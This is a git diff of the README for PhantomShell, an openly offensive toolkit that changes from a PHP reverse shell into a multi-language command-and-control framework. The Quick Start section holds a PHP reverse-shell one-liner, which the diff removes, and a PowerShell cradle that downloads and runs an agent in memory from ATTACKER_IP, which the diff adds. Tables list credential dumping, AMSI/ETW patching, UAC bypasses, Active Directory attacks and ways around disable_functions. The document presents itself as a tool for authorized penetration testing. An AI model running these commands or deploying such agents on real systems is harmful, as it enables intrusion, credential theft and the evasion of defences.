@@ -1,11 +1,14 @@
 # PhantomShell 🔮
 
+[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python)](https://python.org)
+[![.NET 8](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet)](https://dotnet.microsoft.com)
+[![PowerShell 5.1+](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?logo=powershell)](https://docs.microsoft.com/powershell)
 [![PHP 5.6+](https://img.shields.io/badge/PHP-5.6%2B-777BB4?logo=php)](https://php.net)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/Version-4.0-blue.svg)]()
+[![Version](https://img.shields.io/badge/Version-5.2-blue.svg)]()
 [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey)]()
 
-**Self-Adaptive PHP Reverse Shell** — automatically detects server capabilities and adapts between 3 operating modes.
+**Multi-Language Red Team Toolkit** — Python, C#, PowerShell, and PHP agents with encrypted C2, Active Directory attacks, and automated post-exploitation.
 
 > ⚠️ **For authorized penetration testing, CTF competitions, and security research only.**
 
@@ -59,27 +62,47 @@
 
 ## Quick Start
 
-### Listener (Attacker)
+### 1. Start C2 Server
 ```bash
-nc -lvnp 4444
+cd PhantomShell/c2/server
+python3 app.py
+# [+] PhantomShell C2 v5.2
+# phantom> listen tcp 0.0.0.0 4444
+# phantom> listen http 0.0.0.0 8443
 ```
 
-### Deploy (Target)
+### 2. Deploy Agent (pick your language)
+
+**Python (Linux/Windows)**
 ```bash
-# One-liner
-php -r '$s=fsockopen("ATTACKER_IP",4444);$p=proc_open("/bin/bash",array(0=>$s,1=>$s,2=>$s),$x);'
-
-# Full shell
-php phantom.php
-
-# Minimal loader
-php loader.php
+python3 agents/python/agent.py --host ATTACKER_IP --port 4444
 ```
 
-### Module Server (for MINIMAL mode)
+**C# (Windows)**
 ```bash
-cd PhantomShell/
-python3 -m http.server 8888
+dotnet run --project agents/csharp/ -- --host ATTACKER_IP --port 4444
+# Or publish single-file: dotnet publish -c Release -r win-x64 --self-contained
+```
+
+**PowerShell (Windows — in-memory)**
+```powershell
+IEX(IWR http://ATTACKER_IP:8080/Agent.ps1 -UseBasicParsing)
+Start-Agent -C2Host ATTACKER_IP -C2Port 4444
+```
+
+**PHP (Linux)**
+```bash
+php agents/php/phantom.php   # Full mode (100+ commands)
+php agents/php/loader.php    # Minimal stager
+```
+
+### 3. Interact
+```
+phantom> sessions
+phantom> interact 1
+[tcp:aes] [python] [www-data@web01:/var/www]$ sysinfo
+[tcp:aes] [python] [www-data@web01:/var/www]$ ad_enum
+[tcp:aes] [python] [www-data@web01:/var/www]$ privesc_check
 ```
 
 ## Installation
@@ -88,52 +111,99 @@ python3 -m http.server 8888
 git clone https://github.com/OmonovSarvar/PhantomShell.git
 cd PhantomShell
 
-# Edit config in phantom.php
-# Change: $CFG['host'] and $CFG['port']
+# Python agent dependencies
+pip install -r agents/python/requirements.txt
+
+# C# agent (requires .NET 8 SDK)
+dotnet build agents/csharp/
+
+# PowerShell — no installation needed, runs in-memory
 ```
-
-## Configuration
-
-Edit the `$CFG` array at the top of `phantom.php`:
-
-```php
-$CFG = array(
-    'host'      => '0.0.0.0',      // Your attacker IP
-    'port'      => 4444,            // Listener port
-    'http_port' => 8888,            // Module server port
-    'reconnect' => 5,               // Reconnect delay (seconds)
-    'timeout'   => 30,              // Connection timeout
-);
-```
-
-Or use the standalone `config.php` for external configuration.
 
 ## Architecture
 
 ```
 PhantomShell/
-├── phantom.php          # FULL mode (100+ commands, auto-adaptive)
-├── normal.php           # NORMAL mode (standalone)
-├── loader.php           # MINIMAL mode (30-line stager)
-├── config.php           # Shared configuration
-├── modules/             # Loadable modules (MINIMAL mode)
-│   ├── privesc.php
-│   ├── pivoting.php
-│   ├── persistence.php
-│   ├── lateral.php
-│   ├── stealing.php
-│   ├── evasion.php
-│   ├── backdoor.php
-│   ├── c2.php
-│   └── automation.php
-├── docs/                # Documentation
-├── payloads/            # Ready-to-use payloads
-└── examples/            # Docker test lab
+├── proto/                       # Shared protocol & command registry
+│   ├── messages.json            # JSON wire protocol schema
+│   └── commands.json            # 100+ commands (help, completion, validation)
+├── agents/
+│   ├── python/                  # Python agent (Linux/Windows)
+│   │   ├── agent.py             # Entry point + main loop
+│   │   ├── transport/           # TCP, HTTP(S) transports
+│   │   ├── crypto/              # AES-256-GCM + ECDH X25519
+│   │   ├── core/                # Dispatcher, executor, scheduler, loader
+│   │   └── modules/             # recon, privesc (220+ GTFOBins), stealing,
+│   │                            # persist, lateral, evasion, pivoting, ad
+│   ├── csharp/                  # C# Windows agent (.NET 8)
+│   │   ├── PhantomAgent.csproj  # Single-file publish, self-contained
+│   │   ├── Program.cs           # Entry point
+│   │   ├── Transport/           # TCP, HTTP(S)
+│   │   ├── Crypto/              # AES-256-GCM
+│   │   ├── Core/                # Dispatcher, executor, scheduler
+│   │   └── Modules/             # Recon, TokenManip, CredDump, UacBypass,
+│   │                            # AmsiBypass, EtwBypass, Registry, Services, AD
+│   ├── powershell/              # PowerShell agent (in-memory)
+│   │   ├── Agent.ps1            # Cradle + main loop
+│   │   └── Modules/             # AD, CredDump, Lateral, Persist, Evasion
+│   └── php/                     # PHP agent (dual-mode: JSON + plaintext)
+│       ├── phantom.php          # FULL mode (100+ commands, auto-adaptive)
+│       ├── normal.php           # NORMAL mode
+│       ├── loader.php           # MINIMAL mode (stager)
+│       └── modules/             # 9 loadable modules
+├── c2/
+│   └── server/                  # C2 server (TCP + HTTP listeners, sessions, CLI)
+├── playbooks/                   # YAML automation workflows
+├── docs/                        # Documentation
+├── tests/                       # Integration tests
+└── Makefile
 ```
 
-## Execution Bypass
+## Active Directory Attacks
 
-PhantomShell uses 8 methods to bypass `disable_functions`:
+| Technique | Python | C# | PowerShell |
+|-----------|--------|-----|------------|
+| Domain Enumeration | ✅ | ✅ | ✅ |
+| Kerberoasting | ✅ | ✅ | ✅ |
+| AS-REP Roasting | ✅ | — | ✅ |
+| ACL/DACL Abuse | ✅ | ✅ | ✅ |
+| RBCD Abuse | ✅ | ✅ | ✅ |
+| ADCS ESC1-ESC8 | ✅ | ✅ | ✅ |
+| LAPS Retrieval | ✅ | ✅ | ✅ |
+| Shadow Credentials | ✅ | ✅ | ✅ |
+| Golden/Silver Tickets | — | ✅ | — |
+| gMSA Extraction | ✅ | ✅ | ✅ |
+| Token Manipulation | — | ✅ | — |
+| UAC Bypass (4 methods) | — | ✅ | — |
+| AMSI/ETW Bypass | — | ✅ | ✅ |
+| Credential Dumping | ✅ | ✅ | ✅ |
+
+## Windows Post-Exploitation (C# Agent)
+
+| Module | Techniques |
+|--------|------------|
+| **TokenManip** | Steal token, make token, impersonate, rev2self |
+| **CredDump** | SAM dump, DPAPI decrypt, Credential Manager, Windows Vault |
+| **UacBypass** | FodHelper, CMSTP, ComputerDefaults, EventViewer |
+| **AmsiBypass** | Patch AmsiScanBuffer in memory |
+| **EtwBypass** | Patch EtwEventWrite in ntdll |
+| **Registry** | Read/write/delete keys, persistence locations |
+| **Services** | Create/start/stop/delete Windows services |
+
+## Encryption & Transport
+
+| Layer | Technology |
+|-------|-----------|
+| **Key Exchange** | ECDH X25519 + HKDF-SHA256 |
+| **Encryption** | AES-256-GCM (96-bit nonce, 128-bit tag) |
+| **Authentication** | HMAC-SHA256 (pre-shared key) |
+| **Wire Protocol** | 4-byte length-prefix + JSON |
+| **TCP Transport** | Direct socket, retry/reconnect |
+| **HTTP Transport** | User-Agent rotation, URL jitter, TLS, proxy support |
+
+## PHP Execution Bypass
+
+PhantomShell PHP agent uses 8 methods to bypass `disable_functions`:
 
 1. `proc_open` — Full duplex with stdin/stdout/stderr
 2. `popen` — Unidirectional pipe
@@ -143,20 +213,6 @@ PhantomShell uses 8 methods to bypass `disable_functions`:
 6. `passthru` — Binary-safe output
 7. `FFI` — PHP 7.4+ Foreign Function Interface
 8. `mail() + putenv()` — LD_PRELOAD injection
-
-## Pivoting Suite
-
-| Command | Description |
-|---------|-------------|
-| `pivot_portfwd` | PHP-native TCP port forwarding |
-| `pivot_socks` | PHP-native SOCKS4 proxy server |
-| `pivot_tunnel` | Reverse tunnel |
-| `pivot_ligolo` | Ligolo-ng setup guide |
-| `pivot_chisel` | Chisel tunneling guide |
-| `pivot_ssh` | SSH dynamic/local/remote forwarding |
-| `pivot_rpivot` | rpivot setup |
-| `pivot_earthworm` | EarthWorm SOCKS |
-| `pivot_proxychain` | Generate proxychains config |
 
 ## Legal Disclaimer
 
